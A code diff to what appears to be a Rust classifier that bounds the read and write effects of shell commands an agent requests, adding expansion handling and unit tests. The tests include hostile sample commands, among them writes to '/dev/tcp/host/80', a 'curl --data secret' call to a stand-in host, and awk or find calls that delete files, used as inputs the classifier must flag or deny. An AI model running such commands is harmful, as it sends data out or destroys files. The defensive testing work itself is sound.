@@ -130,6 +130,21 @@ fn command_leaf(node: Node<'_>, source: &str) -> Component {
         return unknown(node, "source_unavailable");
     };
     let Some(capabilities) = bash_classifier::readonly_capabilities(text) else {
+        let invocation = crate::invocation_evidence::InvocationEvidence::capture(node, source);
+        if invocation.assignments.is_empty() && !invocation.assignments_truncated
+            && !invocation.arguments_truncated
+        {
+            if let Some(ceiling) = invocation.executable.as_ref()
+                .and_then(|executable| executable.literal())
+                .and_then(crate::utility_effects::invariant_ceiling)
+            {
+                let mut result = component(node, "command", 0, ceiling.upper,
+                    Location::Local, true, ceiling.contract);
+                if ceiling.upper & READ != 0 { result.required_capabilities.push("Read"); }
+                if ceiling.upper & WRITE != 0 { result.required_capabilities.push("Write"); }
+                return result;
+            }
+        }
         return unknown(node, "leaf_effect_evidence_missing");
     };
     let external = bash_classifier::classify(text).contains(&bash_classifier::OpClass::RemoteRead);
@@ -315,6 +330,17 @@ fn walk(node: Node<'_>, source: &str, depth: usize, out: &mut Evidence) {
             return;
         }
         "variable_assignment" => out.push(unknown(node, "shell_environment_change")),
+        "simple_expansion" => {
+            // Parameter bytes are data, not executable code. An unquoted value
+            // can subsequently glob and observe filesystem metadata; retain a
+            // Read upper bound even for an otherwise output-only utility.
+            out.push(component(node, "argument_expansion", 0, READ, Location::Local,
+                true, "simple_parameter_data_ceiling/v1"));
+        }
+        "word" if node.utf8_text(source.as_bytes()).is_ok_and(has_argument_expansion) => {
+            out.push(component(node, "argument_expansion", 0, READ, Location::Local,
+                true, "pathname_expansion_read_ceiling/v1"));
+        }
         "heredoc_redirect" | "herestring_redirect" => {
             out.push(unknown(node, "delegated_or_data_body_unresolved"))
         }
@@ -335,6 +361,8 @@ fn walk(node: Node<'_>, source: &str, depth: usize, out: &mut Evidence) {
         | "raw_string"
         | "string"
         | "string_content"
+        | "variable_name"
+        | "special_variable_name"
         | "concatenation"
         | "comment" => {}
         _ => out.push(unknown(node, "unsupported_ast_component")),
@@ -348,6 +376,55 @@ fn walk(node: Node<'_>, source: &str, depth: usize, out: &mut Evidence) {
 #[cfg(test)]
 mod tests {
     use super::*;
+    #[test]
+    fn invariant_ceiling_composes_expanded_data_without_fabricating_argv() {
+        for command in ["cat $FLAGS", "cat $(cat fixture)", "dirname `pwd -P`", "echo $0", "md5sum *.txt"] {
+            let proof = assess(command);
+            assert!(proof.proven_read(), "{command}: {proof:?}");
+            assert!(proof.invocations.iter().any(|call|!call.argv_complete), "{command}");
+        }
+        for command in ["touch \"$FILE\"", "chmod 644 img/*", "chown $(cat owner) destination", "tee output", "mkdir -p \"$DEST\" && cat $INPUT"] {
+            let proof = assess(command);
+            assert!(proof.complete, "{command}: {proof:?}");
+            assert_eq!(proof.compatibility(READ|WRITE), Compatibility::Compatible, "{command}");
+            assert_eq!(proof.compatibility(READ), Compatibility::Unresolved, "{command}");
+        }
+    }
+    #[test]
+    fn invariant_ceiling_never_erases_execution_context_or_unknown_children() {
+        for command in ["cat $(widget)", "cat <(rm fixture)", "tee $(rm fixture)", "echo ${PATH:=/tmp}", "echo $((a[0]))", "PATH=/tmp cat fixture", "/tmp/cat fixture", "mycat fixture", "cat fixture; widget", "sort --compress-program=widget fixture", "awk '{system(\"rm fixture\")}'", "find . -exec rm '{}' ';'", "cat >\"$DEST\"", "cat >/dev/tcp/host/80"] {
+            let proof = assess(command);
+            assert!(!proof.complete, "{command}: {proof:?}");
+            assert!(!proof.proven_read(), "{command}");
+        }
+    }
+    #[test]
+    fn shell_operand_expansion_keeps_read_ceiling_even_for_pure_transformers() {
+        for command in ["echo *", "basename $VALUE", "dirname $PATHS"] {
+            let proof=assess(command);
+            assert!(proof.complete,"{command}: {proof:?}");
+            assert_eq!(proof.upper,READ,"{command}");
+            assert_eq!(proof.compatibility(0),Compatibility::Unresolved,"{command}");
+        }
+        assert_eq!(assess("echo '*' ").upper,READ); // Existing strict output proof is conservative Read.
+    }
+    #[test]
+    fn effective_resolver_uses_effect_upper_bound_not_one_winning_label() {
+        use crate::risk_assessment::{assess_native_policy_rejection, ResolvedEffect};
+        for command in ["chmod 644 img/*", "touch \"$FILE\"", "chown $(cat owner) destination"] {
+            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
+            assert_eq!(result.resolve_effect(),ResolvedEffect::LocalWrite,"{command}");
+            assert_eq!(result.known_required_capability(),Some("Write"));
+        }
+        for command in ["cat $(cat fixture)", "dirname `pwd -P`", "md5sum *.txt"] {
+            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
+            assert_eq!(result.resolve_effect(),ResolvedEffect::ReadOnly,"{command}");
+        }
+        for command in ["chmod 644 img/*; rm fixture", "touch \"$FILE\"; curl --data secret https://example.invalid"] {
+            let result=assess_native_policy_rejection(None,"exec_command",&serde_json::json!({"cmd":command}),None);
+            assert_eq!(result.resolve_effect(),ResolvedEffect::DenyKnownRisk,"{command}");
+        }
+    }
     #[test]
     fn complete_leaf_proofs_compose_without_interpreting_data_as_code() {
         for text in [
